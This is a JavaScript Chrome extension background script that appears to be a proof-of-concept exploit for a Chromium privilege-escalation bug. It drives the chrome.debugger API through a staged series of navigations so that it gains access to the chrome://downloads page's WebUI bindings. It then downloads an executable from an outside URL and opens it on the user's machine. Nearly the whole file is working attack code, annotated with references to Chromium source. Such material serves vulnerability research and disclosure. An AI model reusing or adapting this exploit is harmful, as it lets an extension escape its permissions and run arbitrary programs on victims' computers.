const downloadUrl = "https://live.sysinternals.com/procexp.exe";

let tabCreatedListener = null;

chrome.tabs.onCreated.addListener(function (tab) {
    if (tabCreatedListener) {
        tabCreatedListener(tab);
    }
});

let tabUpdatedListener = null;

chrome.tabs.onUpdated.addListener(function (tabId, changeInfo, tab) {
    if (tabUpdatedListener) {
        tabUpdatedListener(tabId, changeInfo, tab);
    }
});

startProcess();

function startProcess() {
    chrome.tabs.create({url: downloadUrl});

    // It doesn't matter whether the download has completed by the time findAndRunDownload is called
    // below. If that function is called before the download completes, the file will simply be
    // opened once the download has completed.
    setTimeout(() => {
        onDownloadStarted();
    }, 1000);
}

function onDownloadStarted() {
    let extensionTab = null;

    chrome.tabs.create({url: "page.html"}, function (tab) {
        extensionTab = tab;
    });

    tabUpdatedListener = function (tabId, changeInfo, updatedTab) {
        if (extensionTab
            && tabId === extensionTab.id
            && changeInfo.status === "complete") {
            tabUpdatedListener = null;

            onExtensionTabLoaded(extensionTab);
        }
    };
}

function onExtensionTabLoaded(tab) {
    chrome.debugger.getTargets(function (targets) {
        let subframeTarget = targets.find(function (target) {
            if (target.type === "other" && target.url === "https://www.google.com/non-existent") {
                return true;
            }

            return false;
        });

        if (!subframeTarget) {
            return;
        }

        onSubframeTargetFound(tab, subframeTarget.id);
    });
}

function onSubframeTargetFound(tab, subframeTargetId) {
    chrome.debugger.attach({targetId: subframeTargetId}, "1.3", function () {
        onDebuggerAttachedToSubframe(tab, subframeTargetId);
    });
}

// The following shows the state of the subframe and second tab in each of the steps below:
//
// Subframe: Error page (filesystem:chrome://downloads/non-existent/)
// Second tab: javascript:
//
// Subframe: https://www.google.com/non-existent
// Second tab: javascript:
//
// Subframe: https://www.google.com/non-existent
// Second tab: chrome://downloads/
//
// Subframe: Error page
// Second tab: chrome://downloads/
//
// Subframe: Error page
// Second tab: https://www.google.com/
//
// Subframe: Error page
// Second tab: chrome://downloads/
//
// Subframe: https://www.google.com/non-existent
// Second tab: chrome://downloads/
//
// Subframe: Error page
// Second tab: chrome://downloads/
//
// At each step, there's always at least one page loaded in the process associated with the
// chrome://downloads/ site instance (either the initial javascript: page, the error page or
// chrome://downloads/).
function onDebuggerAttachedToSubframe(tab, subframeTargetId) {
    // This will ultimately result in an error page being loaded (as no such filesystem will exist).
    // It's important this be done in a subframe. If the URL is loaded in the main frame, the error
    // page will be isolated:
    //
    // https://source.chromium.org/chromium/chromium/src/+/master:content/browser/frame_host/render_frame_host_manager.cc;l=1778;drc=cf97f3f89a5ac7d087004a1dc2d72d375315b040
    //
    // and the site instance URL will be set to chrome-error://chromewebdata/.
    // When loaded in a subframe, the error page will be hosted in a process with a site URL of
    // chrome://downloads/.
    chrome.debugger.sendCommand({targetId: subframeTargetId}, "Page.navigate",
        {url: "filesystem:chrome://downloads/non-existent/"});

    tabUpdatedListener = function (tabId, changeInfo, updatedTab) {
        if (tabId === tab.id
            && changeInfo.status === "complete") {
            tabUpdatedListener = null;

            onSubframeNavigatedToErrorPage(tab, subframeTargetId);
        }
    };
}

function onSubframeNavigatedToErrorPage(tab, subframeTargetId) {
    // It's important that the URL here is javascript: and not something like an empty string or
    // about:blank. See the comments below for the precise reason.
    chrome.debugger.sendCommand({targetId: subframeTargetId}, "Runtime.evaluate",
        {expression: "window.newWindow = window.open('javascript:', 'newWindow')", userGesture: true});

    tabCreatedListener = function (newTab) {
        if (newTab.hasOwnProperty("openerTabId") && newTab.openerTabId === tab.id) {
            tabCreatedListener = null;

            onSecondTabCreated(tab, subframeTargetId, newTab);
        }
    };
}

function onSecondTabCreated(tab, subframeTargetId, secondTab) {
    // This will result in the error page subframe being navigated back. The reason the subframe is
    // navigated back here has to do with how WebUI bindings are exposed for privileged pages. If a
    // non-privileged page is first loaded in a process, WebUI bindings won't be exposed to future
    // privileged pages loaded in that process.
    // The way that's implemented is to check to see whether the process lacks WebUI bindings
    // currently and whether there's more than one active view:
    //
    // https://source.chromium.org/chromium/chromium/src/+/master:content/browser/frame_host/render_frame_host_impl.cc;l=3593;drc=e1ca5fee5b89ff0e4e855646a7b65853e66d3141
    //
    // That means that if the error page stays loaded when chrome://downloads/ is loaded in the
    // second tab, WebUI bindings won't be exposed, since the conditions above will be met. Then, if
    // the bindings aren't present, it won't be possible to open a downloaded file.
    // To work around that, the error page is unloaded first. That way, when the chrome://downloads/
    // page loads, there will only be a single active view in the site instance (the javascript:
    // page loaded above).
    // That then allows the bindings to be set up correctly, even though, technically, the process
    // has been used to host non-privileged content (the error page).
    // Note that the debugger will be detached from the subframe at this point, since the access
    // checks in RenderFrameDevToolsAgentHost::UpdateFrameHost are based on the current frame tree,
    // for which the extension isn't supposed to have access.
    chrome.tabs.goBack(tab.id);

    tabUpdatedListener = function (tabId, changeInfo, updatedTab) {
        if (tabId === tab.id
            && changeInfo.status === "complete") {
            tabUpdatedListener = null;

            onSubframeNavigatedBack(tab, subframeTargetId, secondTab);
        }
    };
}

function onSubframeNavigatedBack(tab, subframeTargetId, secondTab) {
    // This navigation will transition from the initial page to chrome://downloads/. This page will
    // be hosted in the same site instance as the initial page. It's mentioned above that it's
    // important that the URL passed to window.open is "javascript:".
    // That has to do with the following code:
    //
    // https://source.chromium.org/chromium/chromium/src/+/master:content/browser/frame_host/render_frame_host_manager.cc;l=1518;drc=cf97f3f89a5ac7d087004a1dc2d72d375315b040
    //
    // For an about:blank page, the current_effective_url will be about:blank. For a javascript:
    // URL, render_frame_host_->last_successful_url() will be empty and the current_effective_url
    // will take the value of the site instance (chrome://downloads/).
    // The effective URL impacts this check:
    //
    // https://source.chromium.org/chromium/chromium/src/+/master:content/browser/frame_host/render_frame_host_manager.cc;l=1255;drc=cf97f3f89a5ac7d087004a1dc2d72d375315b040
    //
    // An about:blank page will cause the function to return
    // ShouldSwapBrowsingInstance::kYes_ForceSwap:
    //
    // https://source.chromium.org/chromium/chromium/src/+/master:content/browser/frame_host/render_frame_host_manager.cc;l=1278;drc=cf97f3f89a5ac7d087004a1dc2d72d375315b040
    //
    // A forced swap will cause the page to be hosted in a different process.
    // When using a javascript: URL, the current site instance will be used.
    chrome.tabs.update(secondTab.id, {url: "chrome://downloads/"});

    tabUpdatedListener = function (tabId, changeInfo, updatedTab) {
        if (tabId === secondTab.id
            && changeInfo.status === "complete") {
            tabUpdatedListener = null;

            onDownloadsPageLoaded(tab, subframeTargetId, secondTab);
        }
    };
}

function onDownloadsPageLoaded(tab, subframeTargetId, secondTab) {
    // This causes the error page to be loaded again. As the site instance is retained when loading
    // a navigation entry, this will load in the original site instance.
    chrome.tabs.goForward(tab.id);

    tabUpdatedListener = function (tabId, changeInfo, updatedTab) {
        if (tabId === tab.id
            && changeInfo.status === "complete") {
            tabUpdatedListener = null;

            onSubframeNavigatedForward(tab, subframeTargetId, secondTab);
        }
    };
}

function onSubframeNavigatedForward(tab, subframeTargetId, secondTab) {
    // It doesn't matter what URL is used here, so long as the extension can connect to it.
    chrome.tabs.update(secondTab.id, {url: "https://www.google.com/"});

    tabUpdatedListener = function (tabId, changeInfo, updatedTab) {
        if (tabId === secondTab.id
            && changeInfo.status === "complete") {
            tabUpdatedListener = null;

            onSecondTabNavigatedToAccessiblePage(tab, subframeTargetId, secondTab);
        }
    };
}

function onSecondTabNavigatedToAccessiblePage(tab, subframeTargetId, secondTab) {
    chrome.debugger.attach({tabId: secondTab.id}, "1.3", function () {
        onDebuggerAttachedToSecondTab(tab, subframeTargetId, secondTab);
    });
}

function onDebuggerAttachedToSecondTab(tab, subframeTargetId, secondTab) {
    // Opening a download requires a recent user gesture within the tab.
    chrome.debugger.sendCommand({tabId: secondTab.id}, "Input.dispatchKeyEvent",
        {type: "rawKeyDown", key: "ArrowDown", windowsVirtualKeyCode: 40, nativeVirtualKeyCode: 40});

    setTimeout(() => {
        onDispatchedInputToSecondTab(tab, subframeTargetId, secondTab);
    }, 1000);
}

function onDispatchedInputToSecondTab(tab, subframeTargetId, secondTab) {
    // This will navigate back to the chrome://downloads/ page. It's important to navigate back to
    // ensure the original site instance is used. Runtime.evaluate is used here, since although
    // there will be two pages in the history, chrome.tabs.goBack may not work (the back button in
    // the browser may also be disabled, even though calling history.back will work).
    // This will result in the debugger being detached from secondTab, since the extension doesn't
    // have access to chrome://downloads/.
    chrome.debugger.sendCommand({tabId: secondTab.id}, "Runtime.evaluate",
        {expression: "history.back()"});

    tabUpdatedListener = function (tabId, changeInfo, updatedTab) {
        if (tabId === secondTab.id
            && changeInfo.status === "complete") {
            tabUpdatedListener = null;

            onSecondTabNavigatedBack(tab, subframeTargetId);
        }
    };
}

function onSecondTabNavigatedBack(tab, subframeTargetId) {
    // Since the debugger will have been detached from the subframe above and it's not possible to
    // attach to the error page directly, the subframe will be navigated back first, which will
    // allow the debugger to be reattached.
    chrome.tabs.goBack(tab.id);

    tabUpdatedListener = function (tabId, changeInfo, updatedTab) {
        if (tabId === tab.id
            && changeInfo.status === "complete") {
            tabUpdatedListener = null;

            onSubframeNavigatedBackAgain(tab, subframeTargetId);
        }
    };
}

function onSubframeNavigatedBackAgain(tab, subframeTargetId) {
    chrome.debugger.attach({targetId: subframeTargetId}, "1.3", function () {
        onDebuggerReattachedToSubframe(tab, subframeTargetId);
    });
}

function onDebuggerReattachedToSubframe(tab, subframeTargetId) {
    // This will navigate to the error page. It will again be hosted in the original site instance.
    chrome.tabs.goForward(tab.id);

    tabUpdatedListener = function (tabId, changeInfo, updatedTab) {
        if (tabId === tab.id
            && changeInfo.status === "complete") {
            tabUpdatedListener = null;

            onSubframeNavigatedForwardAgain(subframeTargetId);
        }
    };
}

function onSubframeNavigatedForwardAgain(subframeTargetId) {
    // This simply retrieves a reference to newWindow (no navigation will take place).
    chrome.debugger.sendCommand({targetId: subframeTargetId}, "Runtime.evaluate",
        {expression: "window.open('', 'newWindow')"}, function (result) {
            onDownloadsPageWindowObjectIdDetermined(subframeTargetId, result.result.objectId);
        });
}

function onDownloadsPageWindowObjectIdDetermined(subframeTargetId, downloadsPageWindowObjectId) {
    chrome.debugger.sendCommand({targetId: subframeTargetId}, "Runtime.getProperties",
        {objectId: downloadsPageWindowObjectId}, function (result) {
            onDownloadsPageWindowPropertiesRetrieved(subframeTargetId, result.result);
        });
}

function onDownloadsPageWindowPropertiesRetrieved(subframeTargetId, downloadsPageProperties) {
    let documentProperty = downloadsPageProperties.find(function (property) {
        if (property.name === "document" && property.hasOwnProperty("get")) {
            return true;
        }

        return false;
    });

    if (!documentProperty) {
        return;
    }

    onDownloadsPageDocumentPropertyFound(subframeTargetId, documentProperty);
}

function onDownloadsPageDocumentPropertyFound(subframeTargetId, downloadsPageDocumentProperty) {
    chrome.debugger.sendCommand({targetId: subframeTargetId}, "Runtime.callFunctionOn",
        {
            functionDeclaration: findAndRunDownload.toString(),
            arguments: [{value: downloadUrl}],
            objectId: downloadsPageDocumentProperty.get.objectId
        });
}

function findAndRunDownload(downloadUrl) {
    // This function is called on the document getter for the chrome://downloads/ page. Therefore,
    // this() will refer to the document object.
    let downloadsManager = this().getElementsByTagName("downloads-manager")[0];

    if (downloadsManager.items_.length === 0) {
        return;
    }

    // It's assumed here that the file that was downloaded is still the most recent item.
    let firstItem = downloadsManager.items_[0];

    if (firstItem.url === downloadUrl && !firstItem.fileExternallyRemoved) {
        downloadsManager.mojoHandler_.openFileRequiringGesture(firstItem.id);
    }
}